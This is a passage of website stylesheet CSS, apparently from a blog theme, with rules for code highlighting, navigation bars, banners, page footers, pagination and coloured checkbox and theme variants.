#3f51b5; } .code>pre .comment { color: var(--text-p4); font-style: italic; } .code>pre .keyword, .code>pre .meta-keyword, .code>pre .javascript .function { color: #8959a8; } .code>pre .type, .code>pre .built_in, .code>pre .tag .name { color: #2196f3; } .code>pre .variable, .code>pre .regexp, .code>pre .ruby .constant, .code>pre .xml .tag .title, .code>pre .xml .pi, .code>pre .xml .doctype, .code>pre .html .doctype, .code>pre .css .id, .code>pre .css .class, .code>pre .css .pseudo { color: #fd8607; } .code>pre .number, .code>pre .preprocessor, .code>pre .literal, .code>pre .constant { color: #fd8607; } .code>pre .class, .code>pre .ruby .class .title, .code>pre .css .rules .attribute { color: #ff9800; } .code>pre .string, .code>pre .meta-string { color: #449e48; } .code>pre .value, .code>pre .inheritance, .code>pre .header, .code>pre .ruby .symbol, .code>pre .xml .cdata { color: #4caf50; } .code>pre .css .hexcolor { color: #6cc; } .code>pre .function, .code>pre .python .decorator, .code>pre .python .title, .code>pre .ruby .function .title, .code>pre .ruby .title .keyword, .code>pre .perl .sub, .code>pre .javascript .title, .code>pre .coffeescript .title { color: #69c; } .highlight.html .line .tag .name, .highlight.css .line .tag .name, .highlight.less .line .tag .name, .highlight.stylus .line .tag .name, .highlight.html .line .selector-tag, .highlight.css .line .selector-tag, .highlight.less .line .selector-tag, .highlight.stylus .line .selector-tag { color: #ee2b29; } .highlight.html .line .selector-class, .highlight.css .line .selector-class, .highlight.less .line .selector-class, .highlight.stylus .line .selector-class, .highlight.html .line .selector-attr, .highlight.css .line .selector-attr, .highlight.less .line .selector-attr, .highlight.stylus .line .selector-attr { color: #fd8607; } .highlight.html .line .attribute, .highlight.css .line .attribute, .highlight.less .line .attribute, .highlight.stylus .line .attribute { color: #3f51b5; } .highlight.html .line .number, .highlight.css .line .number, .highlight.less .line .number, .highlight.stylus .line .number { color: #17afca; } .highlight.objc .line .meta, .highlight.objectivec .line .meta, .highlight.swift .line .meta, .highlight.c .line .meta { color: #8959a8; } .highlight.objc .line .class, .highlight.objectivec .line .class, .highlight.swift .line .class, .highlight.c .line .class { color: var(--text-p1); } .highlight.json .line .attr { color: #e24f5a; } .highlight.json .line .literal { color: #3f51b5; } .highlight.yaml .line .attr { color: #e24f5a; } * { outline: none; } html { font-family: system-ui, \"Microsoft Yahei\", \"Segoe UI\", -apple-system, Roboto, Ubuntu, \"Helvetica Neue\", Arial, \"WenQuanYi Micro Hei\", sans-serif; font-size: 16px; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; scroll-padding-top: 8px; } body { background: var(--site-bg); margin: 0; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizelegibility; -webkit-tap-highlight-color: rgba(0,0,0,0); } div.lazy.img { width: 100%; height: 100%; background-position: center; background-size: cover; } input { background: none; border: none; } input.copy-area { display: block; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-size: 0.8125rem; font-weight: 700; color: var(--text-p3); } .flex { display: flex; align-items: center; } .flex.column { flex-direction: column; } svg.loading { display: block; position: absolute; color: var(--text-p3); z-index: -1; width: 100%; height: 2rem; margin: auto; animation: spin infinite 2s; animation-timing-function: linear; } @-moz-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-webkit-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-o-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } .loading-wrap { margin: 0; text-align: center; background: var(--block); border-radius: 12px; position: relative; padding: 2rem; } .loading-wrap svg { margin: 4px; } .loading-wrap:after { content: '正在加载'; color: var(--text-p1); display: block; font-size: 14px; } .loading-wrap.error:after { content: '加载失败，请稍后重试。'; } audio, video { max-width: 100%; } video { z-index: 1; } pre:not([class]):has(>code) { display: block; padding: 1rem; overflow: auto; } pre:not([class]):has(>code) code { padding: 0; } span.dot, span.sep { font-size: 0.9em; margin: 0 0.25em; } span.dot:before { content: '·'; font-weight: 900; } span.sep:before { content: '/'; padding-left: 2px; padding-right: 2px; } svg.icon { width: 1em; height: 1em; vertical-align: middle; fill: currentColor; overflow: hidden; } svg.active-icon { color: #1cd0fd; } h1, .h1 { font-size: var(--fsh2); font-weight: 700; } @media screen and (max-width: 500px) { h1, .h1 { font-size: var(--fsh2); } } h2, .h2 { font-size: var(--fsh2); margin-top: 1.5em; } h3, .h3 { font-size: var(--fsh3); } h4, .h4 { font-size: var(--fsh4); } h5 { font-size: calc(var(--fsp) + 1px); } h6 { font-size: calc(var(--fsp) + 0px); } .fs15 { --fsp: 0.9375rem; font-size: var(--fsp); } .fs14 { --fsp: 0.875rem; font-size: var(--fsp); } .footnote { --fsp: 0.8125rem; font-size: var(--fsp); } .widgets .post-title { margin: 0.75rem 0; line-height: 1.2; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .widgets .post-title .cap { margin-bottom: 2px; opacity: 0.5; } .widgets .post-title a { color: inherit; font-weight: 500; } .widgets .post-title a:hover { color: #ff5724; } div.toast { max-width: 60%; padding: 1rem 2rem; line-height: 1.5; color: var(--text-p1); font-weight: 500; text-align: center; border-radius: 8px; background: var(--card); position: fixed; left: 50%; top: 32px; transform: translateX(-50%); z-index: 9; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1), 0 12px 16px -4px rgba(0,0,0,0.2); visibility: hidden; } div.toast.show { visibility: visible; -webkit-animation: fadein 0.5s, fadeout 0.5s 2s; animation: fadein 0.5s, fadeout 0.5s 2s; animation-fill-mode: forwards; } @-webkit-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-webkit-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @-moz-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-webkit-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-o-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-moz-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @-webkit-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @-o-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } .article.banner { --text-banner: var(--text); background: var(--block); margin: 0; height: unset; } .article.banner .bg+.content { min-height: 224px; --text-banner: #fff; --button-hover-bg: rgba(255,255,255,0.25); } .article.banner .content .top { align-items: flex-start; margin: 1rem calc(1rem - 4px); } .article.banner .content .title { font-size: calc(17px + 9px); color: var(--text-banner); } .article.banner .content h1 { line-height: 1.2; margin: 0.25rem 0; } .l_body .article.banner .content .bottom.only-title .title { padding: 0.75rem 0; } .l_body[text-indent] .article.banner .content .bottom.only-title { justify-content: center; } .article.banner .bg+.content { transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; --blur-bg: rgba(0,0,0,0); --blur-px: 0px; --blur-sat: 100%; background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .article.banner .bg+.content { background: var(--blur-bg); backdrop-filter: saturate(var(--blur-sat)) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(var(--blur-sat)) blur(var(--blur-px)); } } .article.banner:hover .bg+.content { --blur-bg: rgba(0,0,0,0.1); --blur-px: 20px; --blur-sat: 150%; } .article.banner { --button-hover-bg: rgba(0,0,0,0.05); } :root[data-theme=\"dark\"] .article.banner { --button-hover-bg: rgba(255,255,255,0.15); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .article.banner { --button-hover-bg: rgba(255,255,255,0.15); } } .md-text .article-footer { margin-top: 4rem; padding: 1rem; background: var(--block); border-radius: 12px; border: 1px solid var(--block-border); } .md-text .article-footer:empty { display: none; } .md-text .article-footer .header { font-weight: 500; color: var(--text-p2); font-size: calc(17px + 2px); } .md-text .article-footer .body { --fsp: calc(17px - 2px); } .md-text .article-footer .body input.copy-area { margin: 0.75rem 0; padding: 0; width: 100%; } .md-text .article-footer .body p { color: var(--text-p2); margin: 0.5em 0; } .md-text .article-footer .body p a { font-weight: unset; } .md-text .article-footer .body ul { margin: 0; overflow: hidden; } .md-text .article-footer .body .post-title { margin: 2px 0; line-height: 1.2; word-break: break-all; } .md-text .article-footer .body .post-title p { --fsp: calc(17px - 2px); } .md-text .article-footer section+section { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--block-border); } .md-text .article-footer .social-wrap { grid-gap: 0.5rem 1rem; margin: 0; } .md-text .article-footer .qrcode { width: 128px; padding: 4px; background: #fff; border-radius: 4px; box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1), 0 0 32px 0px rgba(0,0,0,0.1); overflow: hidden; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; height: 0; margin: 0 auto; transform: scale(0.01); } .md-text .article-footer .qrcode img { object-fit: contain; } .md-text .article-footer .qrcode.display { margin: 2rem auto 1rem; height: 128px !important; opacity: 1 !important; transform: scale(1); } .bread-nav { font-weight: 500; display: flex; justify-content: space-between; color: var(--text-banner); } .bread-nav .flex-row { display: flex; align-items: baseline; flex-direction: row; } .bread-nav a { color: var(--text-banner); padding: 4px; border-radius: 2px; } .bread-nav a:hover { background: var(--button-hover-bg); } .bread-nav span { color: var(--text-banner); } .bread-nav span.sep { opacity: 0.5; margin: 0; } .bread-nav span.text { padding: 4px; } .bread-nav div#post-meta span.sep:before { content: '|'; } .bread-nav div#post-meta span.updated { visibility: hidden; } .bread-nav:hover div#post-meta span.updated { visibility: visible; } .bread-nav .ghrepo { font-size: 0.8125rem; display: flex; flex-direction: column; align-items: flex-start; border-left: 1px solid var(--text-meta); padding-left: 8px; } .bread-nav .ghrepo a { display: flex; align-items: center; color: var(--text-banner); } .bread-nav .ghrepo a svg { margin-right: 4px; } .bread-nav .ghrepo a.bold { font-weight: 600; color: var(--text-banner); } .bread-nav .ghrepo a span { margin-left: 4px; } .bread-nav .ghrepo a:hover { opacity: 1; } .l_cover { height: 100vh; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; } .l_cover.post { height: inherit; } .l_cover .cover-wrap { margin-bottom: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; font-size: var(--fsp); } .l_cover .cover-wrap .cover-title { font-weight: 700; font-size: 1.5rem; margin: 1rem 0; line-height: 1.2; color: var(--text); } .l_cover .cover-wrap .description { margin: 1rem 0; } .l_cover .cover-wrap .start-wrap { margin: 2rem 0; flex-shrink: 0; } .l_cover .cover-wrap .start-wrap a.start { display: inline-block; } .l_cover.post .cover { z-index: -1; width: 100%; height: 30vh; max-width: 2048px; min-height: 150px; max-height: 400px; } @media screen and (max-width: 768px) { .l_cover.post .cover { height: 25vh; } } @media screen and (max-width: 500px) { .l_cover.post .cover { height: 20vh; } } @media screen and (min-width: 2048px) { .l_cover.post .cover { margin-top: 4rem; } .l_cover.post .cover .img { border-radius: 2rem; } } .l_cover.wiki .cover-wrap { max-width: 500px; } .l_cover.wiki .cover-wrap .preview { margin-bottom: 2rem; } .l_cover.wiki .cover-wrap .preview img { object-fit: contain; min-width: 96px; min-height: 96px; max-height: 35vh; max-width: 100%; } @media screen and (max-width: 500px) { .l_cover.wiki .cover-wrap .preview img { max-width: 60%; } } .l_cover.wiki .cover-wrap .cover-title:first-child { font-size: 3rem; } .page-footer { margin: 4rem 1rem 3rem; color: var(--text-p2); } .page-footer a { color: var(--text-p2); border-radius: 4px; transition: background 0.2s ease-out; } .page-footer a:hover { color: var(--text); background: var(--block-hover); } .page-footer .sitemap { margin: 0.5rem -4px 2rem; display: grid; scrollbar-width: none; grid-gap: 1rem 1rem; grid-auto-flow: column dense; grid-template-columns: repeat(4, 1fr); overflow: scroll; } .page-footer .sitemap::-webkit-scrollbar { height: 0; width: 0; } .page-footer .sitemap::-webkit-scrollbar-track-piece { background: transparent; } .page-footer .sitemap::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .page-footer .sitemap::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .page-footer .sitemap .sitemap-group { display: flex; flex-direction: column; align-items: flex-start; } .page-footer .sitemap .sitemap-group >span, .page-footer .sitemap .sitemap-group >a { text-decoration: none; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; padding: 4px; } .page-footer .sitemap .sitemap-group >span { font-weight: 500; color: var(--text-p1); margin: 4px 0; } .page-footer .text p { margin: 4px 0; line-height: 1.5; } .page-footer .text a:not([class]) { font-weight: 500; } .navbar { padding: 0 1rem; z-index: 8; top: 0; background: var(--site-bg); position: sticky; position: -webkit-sticky; margin-bottom: 1px; margin-top: -8px; } .navbar:after { content: ''; height: 2px; border-radius: 2px; position: absolute; bottom: 0; left: 1rem; right: 1rem; background: var(--block-hover); } .navbar nav { display: flex; overflow: scroll visible; font-size: 0.875rem; } .navbar nav::-webkit-scrollbar { height: 0; width: 0; } .navbar nav::-webkit-scrollbar-track-piece { background: transparent; } .navbar nav::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .navbar nav::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .navbar nav >p { margin: 0; } .navbar nav a { padding: 2px 0.75rem; margin: 10px 0.25rem 8px 0.25rem; line-height: 2; color: var(--text-p3); border-radius: 4px; font-weight: 500; white-space: nowrap; position: relative; z-index: 1; } .navbar nav a:after { height: 2px; position: absolute; bottom: -8px; left: 0.75rem; right: 0.75rem; background: #1cd0fd; border-radius: 2px; pointer-events: none; } .navbar nav a:hover { background: var(--block-hover); } .navbar nav a.active, .navbar nav a:hover { color: var(--text-p1); } .navbar nav a.active { background: var(--card); box-shadow: 0 0 2px 0px rgba(0,0,0,0.04), 0 0 8px 0px rgba(0,0,0,0.04); cursor: default; pointer-events: none; } .navbar nav a.active:after { content: ''; } .navbar nav a+a { margin-left: 4px; } @media screen and (max-width: 667px) { .navbar.top { margin-top: 0; padding-left: 0; padding-right: 0; } .navbar.top nav a:first-child { margin-left: 1rem; } .navbar.top nav a:last-child { margin-right: 1rem; } } .paginator-wrap { margin: 1rem; display: flex; justify-content: space-between; align-items: center; font-size: 1rem; font-weight: 700; background: var(--card); border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px 0px rgba(0,0,0,0.03); color: var(--text-p3); } .paginator-wrap .page-number { padding: 4px 8px; border-radius: 8px; margin: 2px; } .paginator-wrap a.page-number { color: var(--text-p3); } .paginator-wrap a.page-number:hover { color: var(--text-p1); background: var(--block); } .paginator-wrap .extend { text-align: center; background-size: contain; width: 1rem; height: 1rem; background-origin: content-box; background-clip: content-box; } .paginator-wrap .extend.next { border-left: 1px dashed var(--block-border); background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/arrow/064b95430caf4.svg\"); } .paginator-wrap .extend.prev { border-right: 1px dashed var(--block-border); background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/arrow/f049bbd4e88ec.svg\"); } .paginator-wrap .current { font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; background: var(--block); } .paginator-wrap .extend { padding: 1rem; line-height: 0; filter: grayscale(100%); } .paginator-wrap .extend img { height: 1rem; } .paginator-wrap .extend.disable { pointer-events: none; } .paginator-wrap span.extend { opacity: 0.25; } .paginator-wrap a.extend:hover { filter: unset; } .related-wrap { padding: 0 1rem; margin: 4rem 0; } .related-wrap:empty { display: none; } .related-wrap section.header { display: flex; justify-content: space-between; align-items: center; } .related-wrap section.header >span.title { padding: 0.25rem 0; } .related-wrap section.footer { margin-top: 1rem; } .related-wrap a.more { padding: 0.25rem 0.5rem; border-radius: 8px; color: var(--text-p1); } article.md-text.content+.related-wrap { margin-top: 0; } .related-posts { max-width: 100%; margin: 1rem 0; } .related-posts .item { line-height: 1.2; display: block; border-left: 0; margin-top: 1rem; } .related-posts .item .title { color: var(--text-p1); font-weight: 500; --fsp: calc(17px - 1px); font-size: var(--fsp); transition: color 0.2s ease-out, border 0.2s ease-out; -moz-transition: color 0.2s ease-out, border 0.2s ease-out; -webkit-transition: color 0.2s ease-out, border 0.2s ease-out; -o-transition: color 0.2s ease-out, border 0.2s ease-out; position: relative; padding-bottom: 2px; border-bottom: 1px dashed var(--text-meta); line-height: 1.6; } .related-posts .item .excerpt { color: var(--text-p3); --fsp: calc(17px - 3px); font-size: var(--fsp); margin-top: 0.5rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .related-posts .item.active .title { border-bottom: 1px dashed #1cd0fd; } .related-posts .item:hover .title { color: #ff5724; border-bottom: 1px solid #ff5724; } .related-wrap#read-next .body { display: grid; grid-gap: 16px; grid-template-columns: repeat(auto-fill, calc((100% - 1 * 16px) / 2)); } .related-wrap#read-next .body .item { border-top: 1px dashed var(--block-border); border-bottom: 1px dashed var(--block-border); padding: 1rem 0; } .related-wrap#read-next .body .note { margin-bottom: 0.75rem; font-size: 0.8125rem; color: var(--text-p4); font-weight: 500; } .related-wrap#read-next .body a { margin: 0; line-height: 1.2; color: var(--text-p1); font-size: calc(17px + 2px); } .related-wrap#read-next .body a:hover { color: #ff5724 !important; } .related-wrap#read-next .body #next { text-align: right; } .wiki+.related-wrap#read-next .item a { font-size: calc(17px + 7px); } .wiki+.related-wrap#read-next .item#prev a { color: var(--text-p3); } .related-wrap#comments { padding: 0 1rem; } .related-wrap#comments .cmt-title p { margin: 0; font-size: inherit; } .related-wrap#comments .cmt-title p a { --theme-link: #1cd0fd; --theme-link-opa: rgba(28,208,253,0.2); } .related-wrap#comments .cmt-body { min-height: 150px; position: relative; } .related-wrap#comments .cmt-body svg.loading { top: 60px; } .related-wrap#comments .cmt-body iframe { border-radius: 12px; border: none; width: 100%; } .tag-plugin.about { background: var(--block); border-radius: 12px; padding: 2rem; position: relative; } .tag-plugin.about .nav-back { display: none; position: absolute; line-height: 1; overflow: hidden; left: 0.75rem; top: 0.75rem; align-items: center; } @media screen and (max-width: 667px) { .tag-plugin.about .nav-back { display: flex; } } .tag-plugin.about .nav-back svg { width: 1rem; height: 1rem; } .tag-plugin.about .about-header { display: flex; justify-content: center; flex-wrap: wrap; margin: 1.5rem 0; } .tag-plugin.about .about-header img { object-fit: contain; } .tag-plugin.about .about-header >img { margin: auto 0; } .tag-plugin.about .about-header >p { font-size: 0.75rem; font-weight: 500; color: var(--text-p3); padding-top: 0.75rem; } .tag-plugin.about .about-header >p strong:first-child { font-size: 3rem; font-weight: 700; color: var(--text-p1); margin-right: 0.75rem; } .tag-plugin.about .about-header .avatar { display: inline-flex; margin: 0 1rem; } .tag-plugin.about .about-body >p { line-height: 1.5; } .tag-plugin.about .about-body >p:first-child { margin-top: 2.5rem; } .tag-plugin.about .about-body p+.tag-plugin.navbar .cap { margin-top: 1rem; } .tag-plugin.about .about-header+.about-body { margin-top: 2rem; } @media screen and (max-width: 500px) { .tag-plugin.about { padding: 2rem 1rem; } .tag-plugin.about .about-header p { width: 100%; } } .banner { border-radius: 12px; position: relative; overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-start; height: 220px; } .banner.top { border-radius: 16px; } @media screen and (max-width: 667px) { .banner { height: 180px; } } .banner .bg { z-index: 0; } .banner .content { z-index: 1; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: space-between; } .banner .content .top { display: flex; justify-content: space-between; align-items: center; line-height: 1; margin: 1rem; } .banner .content .top .tag-plugin.navbar { margin: 0; border-radius: 6px; padding: 2px; background: rgba(0,0,0,0.2); overflow: hidden; } .banner .content .top .tag-plugin.navbar:after { content: none; } .banner .content .top .tag-plugin.navbar .link { margin: 0; border-radius: 4px; color: rgba(255,255,255,0.8); padding: 2px 6px; background: none; line-height: 1.5; font-size: 0.9375rem; text-shadow: 0 0 1px rgba(0,0,0,0.12); } .banner .content .top .tag-plugin.navbar .link+.link { margin-left: 2px; } .banner .content .top .tag-plugin.navbar .link:after { content: none; } .banner .content .top .tag-plugin.navbar .link:hover { color: #fff; background: rgba(255,255,255,0.25); } .banner .content .top .tag-plugin.navbar .link.active { color: #fff; background: rgba(255,255,255,0.25); } .banner .content .top .back { background: none; padding: 0; line-height: 0; visibility: hidden; } @media screen and (max-width: 667px) { .banner .content .top .back { visibility: visible; } } .banner .content .top .back svg { width: 20px; height: 20px; fill: #fff; } .banner .banner-link { position: absolute; top: 0; bottom: 0; left: 0; right: 0; opacity: 0; z-index: 2; } .banner img { object-fit: cover; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; margin: 0; height: 100%; width: 100%; } .banner img.bg { position: absolute; top: 0; bottom: 0; left: 0; right: 0; } .banner img.avatar { border-radius: 50%; width: 48px; height: 48px; } .banner .bottom { display: flex; padding: 1rem; width: 100%; box-sizing: border-box; } .banner .title { font-size: 1.5rem; font-weight: 600; } .banner .avatar+.text-area { margin-left: 0.75rem; } .banner .text-area .text { line-height: 1.2; margin-top: 0.25rem; margin-bottom: 0.25rem; } .banner .avatar+.text-area .title { font-size: 1.2rem; } .banner .subtitle { font-size: 0.875rem; } .banner .content:only-child { color: var(--text-p1); } .banner .bg+.content { color: #fff; } .banner .bg+.content .avatar { border: 2px solid #fff; margin: 0; } .banner .bg+.content .bottom { background-image: linear-gradient(rgba(0,0,0,0), rgba(0,0,0,0.2)); text-shadow: 0 0 1px rgba(0,0,0,0.12); } .tag-plugin.banner { transition: transform 2s ease-out; -moz-transition: transform 2s ease-out; -webkit-transition: transform 2s ease-out; -o-transition: transform 2s ease-out; } .tag-plugin.banner:hover img.bg { transform: scale(1.01); } .tag-plugin.banner .navbar a.active { background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .tag-plugin.banner .navbar a.active { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } .tag-plugin.banner .navbar a.active:hover { background: var(--card); } @media screen and (max-width: 667px) { .banner.top { border-radius: 0; } } a.tag-plugin.button { background: var(--theme); color: var(--alpha100); display: inline-flex; align-items: center; justify-content: center; padding: 0 4px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; margin-top: 8px; margin-bottom: 8px; } a.tag-plugin.button svg, a.tag-plugin.button img { height: 24px; width: auto; margin: 0 -0.5em 0 1em; flex-shrink: 0; } a.tag-plugin.button span { text-indent: 0; line-height: 24px; margin: 8px 1em; } a.tag-plugin.button[size='xs'] { margin: 0; border-radius: 2px; } a.tag-plugin.button[size='xs'] svg, a.tag-plugin.button[size='xs'] img { margin: 0 2px 0 0; height: 1em; } a.tag-plugin.button[size='xs'] span { margin: 0; } a.tag-plugin.button:hover { --theme: #ff5724; } .tag-plugin.grid a.tag-plugin.button { width: 100%; box-sizing: border-box; } .md-text .tag-plugin.checkbox { display: flex; align-items: center; font-size: 0.9375rem; line-height: 1.2; --gap-p: calc(var(--gap-p-compact) / 2); /* Checkbox */ /* Radio */ /* Colors */ } .md-text .tag-plugin.checkbox input { -webkit-appearance: none; -moz-appearance: none; -ms-appearance: none; -o-appearance: none; appearance: none; position: relative; height: 16px; width: 16px; cursor: pointer; display: inline-block; outline: none; border-radius: 2px; flex-shrink: 0; margin-right: 8px; pointer-events: none; } .md-text .tag-plugin.checkbox input[type=checkbox]:before, .md-text .tag-plugin.checkbox input[type=checkbox]:after { position: absolute; content: \"\"; background: var(--site-bg); } .md-text .tag-plugin.checkbox input[type=checkbox]:before { left: 1px; top: 5px; width: 0px; height: 2px; transform: rotate(45deg); -webkit-transform: rotate(45deg); -moz-transform: rotate(45deg); -ms-transform: rotate(45deg); -o-transform: rotate(45deg); } .md-text .tag-plugin.checkbox input[type=checkbox]:after { right: 7px; bottom: 3px; width: 2px; height: 0px; transform: rotate(40deg); -webkit-transform: rotate(40deg); -moz-transform: rotate(40deg); -ms-transform: rotate(40deg); -o-transform: rotate(40deg); } .md-text .tag-plugin.checkbox input[type=checkbox]:checked:before { left: 0px; top: 7px; width: 6px; height: 2px; } .md-text .tag-plugin.checkbox input[type=checkbox]:checked:after { right: 3px; bottom: 1px; width: 2px; height: 10px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:before { transform: rotate(0); left: 1px; top: 5px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:after { transform: rotate(0); left: 1px; top: 5px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:checked:before { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:checked:after { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:before { transform: rotate(0); left: 1px; top: 5px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:after { transform: rotate(0); left: 5px; top: 1px; width: 2px; height: 0px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:checked:before { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:checked:after { left: 5px; top: 1px; width: 2px; height: 10px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:before { transform: rotate(45deg); left: 3px; top: 1px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:after { transform: rotate(135deg); right: 3px; top: 1px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:checked:before { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:checked:after { right: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox input[type=radio] { border-radius: 50%; transform: translateY(-1px); } .md-text .tag-plugin.checkbox input[type=radio]:before { content: \"\"; display: block; width: 8px; height: 8px; border-radius: 50%; margin: 2px; transform: scale(0); } .md-text .tag-plugin.checkbox input[type=radio]:checked:before { transform: scale(1); } .md-text .tag-plugin.checkbox input { border: 2px solid var(--theme); } .md-text .tag-plugin.checkbox input[type=checkbox]:checked { background: var(--theme); } .md-text .tag-plugin.checkbox input[type=radio]:checked:before { background: var(--theme); } .tag-plugin.checkbox:not([color]) { --theme: #2196f3; } .tag-plugin { --theme: var(--text-p1); --theme-border: var(--block-border); --theme-block: var(--block); --theme-codeblock: var(--block); } .colorful[color='red'] { --theme: #f44336; --theme-border: #e6b6b3; --theme-block: #fddbd8; --theme-codeblock: #f9edec; --text: #3f1512; --text-p1: #4f1b17; --text-p2: #740e06; } .colorful[color='orange'] { --theme: #fa6400; --theme-border: #e6c7b3; --theme-block: #fde7d8; --theme-codeblock: #f9f1ec; --text: #3f2412; --text-p1: #4f2d17; --text-p2: #743206; } .colorful[color='amber'] { --theme: #ffbd2b; --theme-border: #e6d6b3; --theme-block: #fdf2d8; --theme-codeblock: #f9f5ec; --text: #3f3112; --text-p1: #4f3e17; --text-p2: #745206; } .colorful[color='yellow'] { --theme: #f2e03d; --theme-border: #e6e0b3; --theme-block: #fdf9d8; --theme-codeblock: #f9f7ec; --text: #3f3b12; --text-p1: #4f4917; --text-p2: #746906; } .colorful[color='green'] { --theme: #3dc550; --theme-border: #b3e6ba; --theme-block: #d8fddd; --theme-codeblock: #ecf9ee; --text: #123f19; --text-p1: #174f1f; --text-p2: #067416; } .colorful[color='cyan'] { --theme: #1bcdfc; --theme-border: #b3dbe6; --theme-block: #d8f5fd; --theme-codeblock: #ecf6f9; --text: #12363f; --text-p1: #17434f; --text-p2: #065d74; } .colorful[color='blue'] { --theme: #2196f3; --theme-border: #b3cfe6; --theme-block: #d8edfd; --theme-codeblock: #ecf3f9; --text: #122b3f; --text-p1: #17364f; --text-p2: #064374; } .colorful[color='purple'] { --theme: #9c27b0; --theme-border: #deb3e6; --theme-block: #f8d8fd; --theme-codeblock: #f7ecf9; --text: #39123f; --text-p1: #47174f; --text-p2: #640674; } .colorful[color='theme'] { --theme: #1cd0fd; --theme-border: #b3dbe6; --theme-block: #d8f6fd; --theme-codeblock: #ecf6f9; --text: #12363f; --text-p1: #17444f; --text-p2: #065e74; } .colorful[color='accent'] { --theme: #ff5724; --theme-border: #e6beb3; --theme-block: #fde1d8; --theme-codeblock: #f9efec; --text: #3f1d12; --text-p1: #4f2417; --text-p2: #742006; } .colorful[color='light'] { --theme-block: #fff; --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } .colorful[color='dark'] { --theme-block: #333; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } .colorful[color='warning'] { --theme: #f2e03d; --theme-border: #ffe659; --theme-block: #ffe659; --theme-link: #ff453a; } .colorful[color='error'] { --theme: #f2e03d; --theme-border: #ff453a; --theme-block: #ff453a; --theme-link: #ffe659; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } :root[data-theme=\"dark\"] .tag-plugin.tag { --theme: #1cd0fd; --theme-border: #1f505c; --theme-block: #222d2f; 